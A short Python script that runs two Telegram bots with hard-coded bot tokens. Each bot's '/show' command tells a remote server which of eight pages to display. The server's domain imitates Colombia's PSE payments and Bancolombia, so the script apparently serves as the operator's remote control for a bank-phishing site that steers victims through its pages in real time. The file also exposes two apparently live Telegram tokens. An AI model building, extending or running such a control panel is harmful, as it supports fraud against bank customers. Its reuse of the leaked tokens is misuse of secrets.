import telebot
import requests
import threading

# Lista de bots con sus tokens
BOTS = {
    "Bot1": "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c",
    "Bot2": "7323621941:AAHMKt0uyvD6XZsP6xvw4Pus7XvFjz0q4nY"
}

# URL del servidor
SERVER_URL = "https://psepagosbancolombiaseguros.onrender.com/setPage"

def iniciar_bot(nombre, token):
    bot = telebot.TeleBot(token)

    @bot.message_handler(commands=["start"])
    def send_welcome(message):
        bot.reply_to(message, f"¡Hola! Soy {nombre}. Usa /show para cambiar de página.")

    @bot.message_handler(commands=["show"])
    def cambiar_pagina(message):
        try:
            argumentos = message.text.split()
            if len(argumentos) < 2:
                bot.reply_to(message, "⚠️ Uso correcto: /show pag1|pag2|pag3|pag4|pag5|pag6|pag7|pag8")
                return
            
            pagina = argumentos[1]
            if pagina in ["pag1", "pag2", "pag3", "pag4", "pag5", "pag6", "pag7", "pag8"]:
                response = requests.post(SERVER_URL, json={"pagina": pagina})
                if response.status_code == 200:
                    bot.reply_to(message, f"✅ Página cambiada a {pagina}")
                else:
                    bot.reply_to(message, f"❌ Error al cambiar la página. Código: {response.status_code}")
            else:
                bot.reply_to(message, "⚠️ Página inválida. Usa: /show pag1|pag2|pag3|pag4|pag5|pag6|pag7|pag8")
        except Exception as e:
            bot.reply_to(message, f"❌ Ocurrió un error: {str(e)}")

    print(f"🤖 {nombre} iniciado.")
    bot.polling()

# Iniciar cada bot en un hilo separado
for nombre, token in BOTS.items():
    threading.Thread(target=iniciar_bot, args=(nombre, token)).start()